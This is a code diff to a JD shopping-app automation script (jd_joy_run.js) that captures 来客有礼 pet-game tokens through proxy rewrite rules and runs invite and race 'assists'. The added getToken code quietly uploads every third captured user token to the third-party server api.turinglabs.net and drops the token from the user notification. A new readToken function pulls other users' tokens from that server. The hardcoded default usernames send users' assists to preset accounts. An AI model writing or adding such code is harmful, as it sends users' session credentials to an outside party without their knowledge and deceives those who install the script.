@@ -1,6 +1,6 @@
 /**
  宠汪汪邀请助力与赛跑助力脚本，感谢github@Zero-S1提供帮助
- 更新时间：2020-11-12（宠汪汪助力更新Token的配置正则表达式已改）
+ 更新时间：2020-11-29（宠汪汪助力更新Token的配置正则表达式已改）
 
  token时效很短，几个小时就失效了,闲麻烦的放弃就行
  每天拿到token后，可一次性运行完毕即可。
@@ -15,8 +15,8 @@ hostname = draw.jdfcloud.com
 Surge
 [Script]
 宠汪汪邀请助力与赛跑助力 = type=cron,cronexp="15 10 * * *",wake-system=1,timeout=20,script-path=https://raw.githubusercontent.com/lxk0301/jd_scripts/master/jd_joy_run.js
-宠汪汪助力更新Token = type=http-response,pattern=^https:\/\/draw\.jdfcloud\.com\/\/api\/user\/addUser\?code=, requires-body=1, max-size=0, script-path=https://raw.githubusercontent.com/lxk0301/jd_scripts/master/jd_joy_run.js
-宠汪汪助力获取Token = type=http-request,pattern=^https:\/\/draw\.jdfcloud\.com\/\/api\/user\/user\/detail\?openId=, requires-body=1, max-size=0, script-path=https://raw.githubusercontent.com/lxk0301/jd_scripts/master/jd_joy_run.js
+宠汪汪助力更新Token = type=http-response,pattern=^https:\/\/draw\.jdfcloud\.com(\/mirror)?\/\/api\/user\/addUser\?code=, requires-body=1, max-size=0, script-path=https://raw.githubusercontent.com/lxk0301/jd_scripts/master/jd_joy_run.js
+宠汪汪助力获取Token = type=http-request,pattern=^https:\/\/draw\.jdfcloud\.com(\/mirror)?\/\/api\/user\/user\/detail\?openId=, requires-body=1, max-size=0, script-path=https://raw.githubusercontent.com/lxk0301/jd_scripts/master/jd_joy_run.js
 
 圈X
 [task_local]
@@ -24,26 +24,26 @@ Surge
 15 10 * * * https://raw.githubusercontent.com/lxk0301/jd_scripts/master/jd_joy_run.js, tag=宠汪汪邀请助力与赛跑助力, img-url=https://raw.githubusercontent.com/58xinian/icon/master/jdcww.png, enabled=true
 [rewrite_local]
 # 宠汪汪助力更新Token
-^https:\/\/draw\.jdfcloud\.com\/\/api\/user\/addUser\?code= url script-response-body https://raw.githubusercontent.com/lxk0301/jd_scripts/master/jd_joy_run.js
+^https:\/\/draw\.jdfcloud\.com(\/mirror)?\/\/api\/user\/addUser\?code= url script-response-body https://raw.githubusercontent.com/lxk0301/jd_scripts/master/jd_joy_run.js
 # 宠汪汪助力获取Token
-^https:\/\/draw\.jdfcloud\.com\/\/api\/user\/user\/detail\?openId= url script-request-header https://raw.githubusercontent.com/lxk0301/jd_scripts/master/jd_joy_run.js
+^https:\/\/draw\.jdfcloud\.com(\/mirror)?\/\/api\/user\/user\/detail\?openId= url script-request-header https://raw.githubusercontent.com/lxk0301/jd_scripts/master/jd_joy_run.js
 
 *****Loon****
 [Script]
 cron "15 10 * * *" script-path=https://raw.githubusercontent.com/lxk0301/jd_scripts/master/jd_joy_run.js, tag=宠汪汪邀请助力与赛跑助力
-http-response ^https:\/\/draw\.jdfcloud\.com\/\/api\/user\/addUser\?code= script-path=https://raw.githubusercontent.com/lxk0301/jd_scripts/master/jd_joy_run.js, requires-body=true, timeout=10, tag=宠汪汪助力更新Token
-http-request ^https:\/\/draw\.jdfcloud\.com\/\/api\/user\/user\/detail\?openId= script-path=https://raw.githubusercontent.com/lxk0301/jd_scripts/master/jd_joy_run.js, requires-body=true, timeout=10, tag=宠汪汪助力获取Token
+http-response ^https:\/\/draw\.jdfcloud\.com(\/mirror)?\/\/api\/user\/addUser\?code= script-path=https://raw.githubusercontent.com/lxk0301/jd_scripts/master/jd_joy_run.js, requires-body=true, timeout=10, tag=宠汪汪助力更新Token
+http-request ^https:\/\/draw\.jdfcloud\.com(\/mirror)?\/\/api\/user\/user\/detail\?openId= script-path=https://raw.githubusercontent.com/lxk0301/jd_scripts/master/jd_joy_run.js, requires-body=true, timeout=10, tag=宠汪汪助力获取Token
  **/
 const isRequest = typeof $request != "undefined"
-const $ = new Env('来客有礼宠汪汪');
+const $ = new Env('宠汪汪赛跑');
 const JD_BASE_API = `https://draw.jdfcloud.com//pet`;
 //此处填入你需要助力好友的京东用户名
-//给下面好友邀请助力的
-let invite_pins = ["jd_6cd93e613b0e5,被折叠的记忆33,jd_704a2e5e28a66,jd_45a6b5953b15b,zooooo58"];
-//给下面好友赛跑助力
-let run_pins = ["jd_6cd93e613b0e5,被折叠的记忆33,jd_704a2e5e28a66,jd_45a6b5953b15b,zooooo58"];
+//下面给出好友邀请助力的示例填写规则
+let invite_pins = ["jd_6cd93e613b0e5,被折叠的记忆33,jd_704a2e5e28a66,jd_45a6b5953b15b,zooooo58,jd_66f5cecc1efcd"];
+//下面给出好友赛跑助力的示例填写规则
+let run_pins = ["jd_6cd93e613b0e5,被折叠的记忆33,jd_704a2e5e28a66,jd_45a6b5953b15b,zooooo58,jd_66f5cecc1efcd"];
 // $.LKYLToken = '76fe7794c475c18711e3b47185f114b5' || $.getdata('jdJoyRunToken');
-$.LKYLToken = $.getdata('jdJoyRunToken');
+// $.LKYLToken = $.getdata('jdJoyRunToken');
 //Node.js用户请在jdCookie.js处填写京东ck;
 const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
 //IOS等用户直接用NobyDa的jd cookie
@@ -55,7 +55,7 @@ const headers = {
   'Lottery-Access-Signature' : '',
   'Content-Type' : 'application/json',
   'reqSource' : 'weapp',
-  'User-Agent' : 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/7.0.15(0x17000f2d) NetType/4G Language/zh_CN',
+  'User-Agent' : $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0") : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
   'Cookie' : '',
   'openId' : '',
   'Host' : 'draw.jdfcloud.com',
@@ -101,19 +101,35 @@ if ($.isNode()) {
 }
 
 //获取来客有礼Token
-function getToken() {
+let count = 0;
+async function getToken() {
   const url = $request.url;
   $.log(`${$.name}url\n${url}\n`)
   if (isURL(url, /^https:\/\/draw\.jdfcloud\.com(\/mirror)?\/\/api\/user\/addUser\?code=/)) {
     const body = JSON.parse($response.body);
-    const LKYLToken = body.data.token;
-    $.log(`${$.name} token\n${LKYLToken}\n`)
-    if ($.getdata('jdJoyRunToken')) {
-      $.msg($.name, '更新Token: 成功🎉', `\n${LKYLToken}\n`);
-    } else {
-      $.msg($.name, '更新Token: 成功🎉', `\n${LKYLToken}\n`);
+    const LKYLToken = body.data && body.data.token;
+    if (LKYLToken) {
+      $.log(`${$.name} token\n${LKYLToken}\n`);
+      count = $.getdata('countFlag') ? $.getdata('countFlag') * 1 : 0;
+      count ++;
+      console.log(`count: ${count}`)
+      $.setdata(`${count}`, 'countFlag');
+      if ($.getdata('countFlag') * 1 === 3) {
+        count = 0;
+        $.setdata(`${count}`, 'countFlag');
+        $.msg($.name, '更新Token: 成功🎉', ``);
+        console.log(`开始上传Token`)
+        await $.http.get({url: `http://api.turinglabs.net/api/v1/jd/joy/create/${LKYLToken}/`}).then((resp) => {
+          if (resp.statusCode === 200) {
+            let { body } = resp;
+            console.log(`Token提交结果:${body}`)
+            body = JSON.parse(body);
+            console.log(`${body.message}`)
+          }
+        });
+      }
+      $.setdata(LKYLToken, 'jdJoyRunToken');
     }
-    $.setdata(LKYLToken, 'jdJoyRunToken');
     $.done({ body: JSON.stringify(body) })
   } else if (isURL(url, /^https:\/\/draw\.jdfcloud\.com(\/mirror)?\/\/api\/user\/user\/detail\?openId=/)){
     if ($request && $request.method !== 'OPTIONS') {
@@ -128,19 +144,49 @@ function getToken() {
       //}
       $.setdata(LKYLToken, 'jdJoyRunToken');
 
-      $.msg($.name, '获取Token: 成功🎉', `\n${LKYLToken}\n`);
+      $.msg($.name, '获取Token: 成功🎉', ``);
 
       // $.done({ body: JSON.stringify(body) })
       $.done({ url: url })
     }
+  } else {
+    $.done()
   }
 }
+function readToken() {
+  return new Promise(resolve => {
+    $.get({url: `http://api.turinglabs.net/api/v1/jd/joy/read/1/`}, (err, resp, data) => {
+      try {
+        if (err) {
+          console.log(`${JSON.stringify(err)}`)
+          console.log(`${$.name} API请求失败，请检查网路重试`)
+        } else {
+          if (data) {
+            console.log(data)
+            data = JSON.parse(data);
+          }
+        }
+      } catch (e) {
+        $.logErr(e, resp)
+      } finally {
+        resolve(data);
+      }
+    })
+  })
+}
 async function main() {
-  console.log(`打印token \n${$.getdata('jdJoyRunToken')}\n`)
   if (!cookiesArr[0]) {
     $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/', {"open-url": "https://bean.m.jd.com/"});
     return;
   }
+  const readTokenRes = await readToken();
+  if (readTokenRes && readTokenRes.code === 200) {
+    $.LKYLToken = readTokenRes.data[0] || $.getdata('jdJoyRunToken');
+  } else {
+    $.LKYLToken = $.getdata('jdJoyRunToken');
+  }
+  // $.LKYLToken = $.getdata('jdJoyRunToken');
+  console.log(`打印token \n${$.LKYLToken}\n`)
   if (!$.LKYLToken) {
     $.msg($.name, '【提示】请先获取来客有礼宠汪汪token', "微信搜索'来客有礼'小程序\n点击底部的'发现'Tab\n即可获取Token");
     return;
@@ -153,8 +199,6 @@ async function main() {
       $.inviteReward = 0;
       $.runReward = 0;
       console.log(`\n开始【京东账号${$.index}】${UserName}\n`);
-      message = '';
-      subTitle = '';
       $.jdLogin = true;
       $.LKYLLogin = true;
       console.log(`=============【开始邀请助力】===============`)
